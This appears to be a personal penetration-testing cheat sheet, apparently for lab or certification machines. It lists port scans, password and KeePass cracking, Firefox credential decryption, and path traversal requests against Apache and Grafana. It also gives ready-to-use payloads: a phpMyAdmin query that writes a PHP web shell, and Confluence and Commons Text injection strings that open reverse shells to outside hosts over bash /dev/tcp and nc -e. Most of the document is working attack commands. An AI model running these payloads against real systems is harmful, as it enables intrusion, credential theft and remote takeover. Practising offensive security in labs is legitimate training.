## IP GEN
```powershell
for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
```
## INTERNAL PORTSCAN
```powershell 
1..65535 | %{echo((new-object Net.Sockets.TcpClient).Connect("172.16.189.12",$_))"Port $_isopen!"} 2>$null
```
## PORT KNOCKING:

- If specific port is filtered or not present we can try port knocking which opens the port from the server. (we need some hint to approach this)
- Try -r flag in nmap
- If identified knockd.conf from /etc/knockd.conf using LFI or any other way.
- View the ports and try nc ip port to connect to the ports in target in a specific sequence mentioned.

## CHECK FILES INTEGRITY:
```
md5sum file  
```
Goto virus total and paste it.  
Check if its is legit and belongs to legit org or stuff
    
## GOT ZIP FILES?
- Exiftool them (Look for usernames)  
- .msi files? check file integrity (md5sum) 
- try unzip > didn’t work? 
- Use zip2john file.zip  
- Use that password to open the zip file
    
## KEEPASS CRACKING:
```
keepass2john Database.kdbx > keepass.hash  

hashcat -m 13400 keepass.hash ~/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

## Desired wordlist generator
##### MaskProcessor  
mp64 ?d?u"our word without quotes" > pass.txt (?d with digits ?u with upper case - ordered sequence)
##### Adding Rule at end of rockyou
```
copy and rename rockyou in our dir

echo \$1 > demo.rule (adding rule in hashcat to append 1 in every last letter of all passwords)

hashcat -r demo1.rule --stdout demo.txt

For more rules refer - https://hashcat.net/wiki/doku.php?id=rule_based_attack

sed -i 's/$/1@3$5/' rockmf.txt (appending 1@3$5 at end of every password in rockmf.txt)
or
awk '{print $0"1@3$5"}' passwords.txt > new_passwords.txt

awk '{print $0"2019"; print $0"25"}' hello.txt (To append 2019 and 25 in every pass)

awk '{print $0; print $0"2019"; print $0"25"}' hello (To append 2019 and 25 and default one in every pass)

crunch 6 6 -t Lab%%% > wordlist
O/P 
Lab000 
Lab001 
Lab002 
Lab003 
Lab004 
Lab005 
Lab006
```
    
IF YOU NEED USERNAMES FOR BRUTEFORCE LIKE KERBRUTE OR ANYTHING AND YOU HAVE FIRST AND LAST NAME FOR EG: Fergus Smith,  
CREATE A WORDLIST LIKE,
Fergus Smith 
FSmith 
F.Smith

## GPG DECODE
```
gpg –batch –passphrase HARPOCRATES -d login.txt.gpg
```
## OPENSSL PUBLIC KEY LOGIN VIA SSH
Reference : https://gupta-bless.medium.com/walkthrough-of-w34kn3ss-machine-e7abed592b01

## MOODLE Exploit
Reference : https://medium.com/egghunter/goldeneye-1-vulnhub-walkthrough-f31d80a5267b

## Nibbleblog
- IPPSEC NIBBLES HTB

## PHPMYADMIN SQL Query to RCE
```
SELECT"<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"> <INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY> </HTML>"INTOOUTFILE'/var/www/html/wordpress/cmd.php'
```
Note : Check the right path and will work only on writable directory
## IPERIUS BACKUP:
https://www.exploit-db.com/exploits/46863 
## OPENSMTPD RUNNING AS ROOT?
https://www.exploit-db.com/exploits/48051
## FIREFOX DECRYPT
```
cd .mozilla/firefox/by2pyaht.default-esr  
copy login.json and key4.db to kali  
git clone https://github.com/unode/firefox_decrypt 
python3 firepwd.py -d mozilla  
We get ssh username and pass
```
## EYESOFNETWORK
https://rioru.github.io/pentest/web/2017/03/28/from-unauthenticated-to-root-supervision.html 

## APACHE 2.4.49:  
Run Searchploit
```
sudo nmap -sV -p 443 --script http-vuln-cve-2021-41773.nse 192.168.148.13  

curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```
## GRAFANA RCE:
```
curl --path-as-is http://ip:3000/public/plugins/mysql/../../../../../../../../Users/install.txt
```
## CMS MADE SIMPLE 2.2.5 (AUTH)
https://www.exploit-db.com/exploits/44976
Note : Required Modifications Check 13.2.2, 13.2.3
## If we get SSL ERROR  
response = requests.post(url, data=data, allow_redirects=False, verify=False) ...
response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False) ...
response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)

## If we get Index error when running exploit? Add print line below def parse_csrf_token

def parse_csrf_token(location):  
print "[+] String that is being split: " + location
```
Observe http://192.168.177.52/cmsms/admin?_sk_=292aa89bb8ff807f3b4 _sk_ parameter here in exploit error output.
```
Modify as per need
## Atlassian Confluence
```
CVE-2022-26134?

curlhttp://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```
##### Configuration File  
/var/atlassian/application-data/confluence/confluence.cfg.xml

Note: The Hashcat mode number for Atlassian (PBKDF2-HMAC-SHA1) hashes2 is 12001 hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
## XFREERDP
```
xfreerdp /u:stephanie /d:corp.com /v:192.168.207.72 /size:1980x900 
/size:1980x900
```
## GIT
```
Move to git directory 
git status  
git log  
git show
```
## ENABLING RDP(FIREWALL RULE)
```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\TerminalServer' -name "fDenyTSConnections" -value 0 
Enable-NetFirewallRule -DisplayGroup "RemoteDesktop"
```
## Powershell EP Bypass
```
powershell -ep bypass  
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process
```
## CREATE A SERVICE IN WINDOWS
```
C:\Windows\System32\sc.execreateSchedulerbinPath= "C:\Scheduler\scheduler.exe"

C:\Windows\System32\sc.exe delete Scheduler
```
## BORG
```
sudo /usr/bin/borglist/opt/borgbackup

sudo /usr/bin/borg extract /opt/borgbackup::home (look for borgbackup file and you can use list command to list archives and then
add ::archivename to view files in archives)

sudo /usr/bin/borg extract --stdout /opt/borgbackup::home (to read files)
```
## DOAS SUID
```
/etc/doas.conf  
/var/local/etc/doas.conf  
doas service apache24 onestart  
/usr/local/bin/doas -u root whoami 
/usr/local/bin/doas -u root /bin/sh
```
## UMBRACO 7: (RCE)
https://github.com/Jonoans/Umbraco-RCE 
## APACHE COMMON TEXT SSTI
```
$%7Bscript:javascript:java.lang.Runtime.getRuntime().exec('busybox+nc+192.168.45.166+4444+-e+/bin/sh')%7D
```
## SHAREPOINT
```
/usr/share/seclists/Discovery/Web-Content/CMS/sharepoint.txt
```
## CRACKMAPEXEC UPLOAD FILE:
```
proxychains crackmapexec mssql 10.10.139.148 -u sql_svc -p Dolphin1 --put-file /usr/share/windows-resources/binaries/nc.exe 'C:\users\public\documents\nc.exe'
```